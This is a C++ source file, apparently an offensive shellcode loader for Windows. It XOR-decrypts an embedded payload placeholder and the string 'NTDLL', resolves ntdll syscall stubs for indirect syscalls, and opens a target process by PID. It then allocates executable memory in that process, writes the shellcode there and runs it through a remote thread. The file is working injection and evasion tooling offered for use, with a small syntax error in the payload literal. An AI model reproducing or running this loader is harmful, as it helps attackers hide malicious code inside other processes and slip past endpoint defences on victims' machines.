#include <windows.h>
#include <stdio.h>
#include "wonka.h"

//bring in and define external variables
extern "C" {
    DWORD CSSN;
    DWORD OPSSN;
    DWORD CTSSN;
    DWORD WVMSSN;
    DWORD WFSOSSN;
    DWORD AVMSSN;

    UINT_PTR NtCreateTimerSyscall;
    UINT_PTR NtOpenTimerSyscall;
    UINT_PTR NtSetTimerSyscall;
    UINT_PTR NtQueryTimerSyscall;
    UINT_PTR NtCancelTimerSyscall;
}

//define XOR encrypted shellcode
unsigned char shellcode[] = "XOR ENCRYPTED PAYLOAD HERE;

//define XOR encrypted string "NTDLL"
char NDLCRY[] = "\x14\x35\x37\x28\x3b";

int main(int argc, char* argv[]) {

    //decrypt shellcode
    char key[] = "Zasdwes2";
    int ciphertext_length = sizeof(shellcode);
    //delete following line if you do not XOR encrypt your shellcode
    xor_decrypt(shellcode, ciphertext_length, key);

    //define necessary variables for use
    SIZE_T rS = sizeof(shellcode);
    LARGE_INTEGER timeout;
    timeout.QuadPart = -1100;
    HANDLE pH = NULL;
    HANDLE nT = NULL;
    DWORD PID = NULL;
    PVOID bA = NULL;
    HMODULE hNTDLL;
    NTSTATUS STATUS = NULL;

    //check if PID was passed as argument, if not exit
    if (argc < 2) {
        printf("run with %s: <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)(uintptr_t)PID, NULL };

    //decrypt ntdll string and convert to LPCWSTR
    DecryptXOR(NDLCRY, strlen(NDLCRY), key, strlen(key));
    LPCWSTR NDLNOCRY = ConvertToLPCWSTR(NDLCRY);

    //get handle to ntdll
    hNTDLL = GetModuleHandleW(NDLNOCRY);

    //get stub location of timer related syscalls
    IndirectPrelude(hNTDLL, "NtCreateTimer", &NtCreateTimerSyscall);
    IndirectPrelude(hNTDLL, "NtOpenTimer", &NtOpenTimerSyscall);
    IndirectPrelude(hNTDLL, "NtSetTimer", &NtSetTimerSyscall);
    IndirectPrelude(hNTDLL, "NtQueryTimer", &NtQueryTimerSyscall);
    IndirectPrelude(hNTDLL, "NtCancelTimer", &NtCancelTimerSyscall);

    //open process with the passed PID
    STATUS = OP(&pH, PROCESS_ALL_ACCESS, &OA, &CID);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //allocate memory inside of the process
    STATUS = AVM(pH, &bA, 0, &rS, MEM_COMMIT | MEM_RESERVE, 0x40);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //write the shellcode to the allocated region
    STATUS = WVM(pH, bA, shellcode, sizeof(shellcode), NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //create and execute thread with the previously written shellcode
    STATUS = CT(&nT, THREAD_ALL_ACCESS, NULL, pH, bA, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //wait for thread to be fully executed conclude
    STATUS = WFSO(nT, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //cleanup by closing thread and closing process handle
    if (nT) {
        C(nT);
    }
    if (pH) {
        C(pH);
    }
 }
